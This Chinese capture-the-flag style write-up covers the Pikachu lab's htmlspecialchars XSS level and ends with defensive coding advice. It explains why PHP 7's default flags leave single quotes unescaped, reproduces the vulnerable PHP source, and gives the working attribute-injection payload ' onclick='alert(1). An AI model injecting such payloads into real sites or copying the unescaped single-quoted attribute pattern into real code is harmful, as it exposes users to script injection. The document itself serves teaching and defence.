# XSS 之 htmlspecialchars 通关笔记
> 这关最值得记的一句话，是作者自己写在源码注释里的：
>
> **「使用了 htmlspecialchars 进行处理，是不是就没问题了呢，htmlspecialchars 默认不对 `'` 处理」**
---
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | Cross-Site Scripting → xss之htmlspecialchars |
| 页面地址 | `http://pikachu/vul/xss/xss_02.php` |
| 页面形式 | 输入框，提交后显示「你的输入已经被记录」 |
| 目标 | 绕过 htmlspecialchars，让页面弹窗 |
---
## 二、我的解题步骤
### 步骤 1：先试标准 payload
输入：
```html
<script>alert(1)</script>
```
提交后页面显示：
```
你的输入已经被记录:
<script>alert(1)</script>
```
**注意：这里显示的是文字的尖括号，不是弹出窗口。**
说明 `htmlspecialchars` 生效了，`<` 变成了 `&lt;`。
### 步骤 2：看源码，注意输出位置
```php
$message=htmlspecialchars($_GET['message']);
$html1.="<p class='notice'>你的输入已经被记录:</p>";
$html2.="<a href='{$message}'>{$message}</a>";
```
两个关键点：
1. `htmlspecialchars()` **没有传第二个参数**，用的是默认值
2. 输出位置是 `<a href='...'>` —— **单引号属性**
作者自己写了注释：
```php
//使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对'处理
//输入的内容被处理后输出到了input标签的value属性里面,试试:' onclick='alert(111)'
```
### 步骤 3：查 htmlspecialchars 的默认参数
```php
htmlspecialchars(string $string, int $flags = ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401, ...)
```
这是 PHP 8.1 之后的默认值。**在 PHP 7.x（Pikachu 用的是 7.3.4）默认是 `ENT_COMPAT`。**
| 常量 | `"` | `'` |
| --- | --- | --- |
| `ENT_COMPAT`（PHP 7 默认） | 转义 | **不转义** |
| `ENT_QUOTES` | 转义 | 转义 |
**所以 `'` 是原样保留的。**
### 步骤 4：用单引号突破
提交：
```html
' onclick='alert(1)
```
### 步骤 5：点击页面上的链接
页面生成了一个链接，文字就是你的输入内容。
**点它 → 弹窗。**
---
## 三、原理分析
### 3.1 完整源码
```php
$html='';
$html1='';
$html2='';
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="<p class='notice'>输入点啥吧！</p>";
    }else {
        $message=htmlspecialchars($_GET['message']);
        $html1.="<p class='notice'>你的输入已经被记录:</p>";
        $html2.="<a href='{$message}'>{$message}</a>";
    }
}
```
### 3.2 payload 代入后的结果
模板：
```php
"<a href='{$message}'>{$message}</a>"
```
payload 是 `' onclick='alert(1)`：
```html
<a href='' onclick='alert(1)'>' onclick='alert(1)</a>
```
拆解：
| 部分 | 作用 |
| --- | --- |
| `href='` | 模板开头 |
| `'`（payload 第一个字符） | **闭合了 href 的值** |
| ` onclick='alert(1)` | 注入了一个新属性 |
| `'`（模板结尾） | 刚好闭合 onclick |
**点击这个链接，就会执行 `alert(1)`。**
### 3.3 我验证过的真实输出
```html
<a href='' onclick='alert(1)'>' onclick='alert(1)</a>
```
和上面的推导完全一致。
---
## 四、知识点与笔记
### 4.1 htmlspecialchars 到底转义了什么
| 字符 | 转义成 |
| --- | --- |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;`（ENT_COMPAT 就有） |
| `'` | `&#039;`（**只有 ENT_QUOTES 才转**） |
### 4.2 为什么"单引号属性"是关键
看三种情况：
| 输出位置 | 默认配置（ENT_COMPAT）能防住吗 |
| --- | --- |
| `<p>{$x}</p>` | 能（`<` 被转义） |
| `<input value="{$x}">`（双引号） | 能（`"` 被转义） |
| `<input value='{$x}'>`（**单引号**） | **不能**（`'` 没转义） |
**同一个函数，换个引号就漏了。**
### 4.3 正确写法
```php
// 明确指定 ENT_QUOTES
$message = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```
第三个参数 `'UTF-8'` 也很重要——**不指定的话，某些多字节编码可能被绕过**（历史上著名的 GBK 宽字节注入就是这类问题）。
### 4.4 属性值永远用双引号
```html
<!-- 好 -->
<input value="...">
<!-- 不好 -->
<input value='...'>
```
虽然加了 `ENT_QUOTES` 之后单引号也安全，但**双引号是 HTML 的惯例，也更容易配合各种转义函数**。
### 4.5 更彻底的方案：属性值全转义
```php
function attr($s) {
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}
```
---
## 五、和前面几关的区别
| 关卡 | 防护 | 绕过点 |
| --- | --- | --- |
| xss之过滤 | 正则删 `<script>` | 大小写 / 换标签 |
| **xss之htmlspecialchars** | **htmlspecialchars（默认参数）** | **单引号没转义 + 单引号属性** |
对比很有意思：
- 上一关是"根本没防住"
- 这一关是"**防了一半**"——函数用对了，参数没给全
**这比完全没防更危险，因为开发者以为自己安全了。**
---
## 六、防御怎么写
### 6.1 标准写法
```php
$message = htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
```
### 6.2 封装成函数，避免每次漏参数
```php
function h($s) {
    return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}
// 使用
echo "<p>" . h($input) . "</p>";
```
### 6.3 现代框架怎么做的
| 框架 | 做法 |
| --- | --- |
| Laravel | Blade 的 `{{ }}` 自动转义 |
| Django | 模板默认自动转义 |
| React | JSX 默认转义（除非用 `dangerouslySetInnerHTML`） |
| Vue | `{{ }}` 转义，`v-html` 不转义 |
**框架默认帮你做了，但只要你手动用了"不转义"的接口，就回到原点。**
---
## 七、总结
| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 转义函数用对了，但参数没给全 |
| 关键点 | PHP 7 的 `htmlspecialchars` 默认不转单引号 |
| 突破口 | 输出在**单引号属性**里 |
| payload | `' onclick='alert(1)` |
| 修复 | 加 `ENT_QUOTES` + 指定 `UTF-8` |
**一句话**：
> **"用了转义函数"不等于"安全"，还要看：参数给全了吗？输出在什么上下文里？**
---
## 参考
- [PHP: htmlspecialchars](https://www.php.net/manual/zh/function.htmlspecialchars.php)
- [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
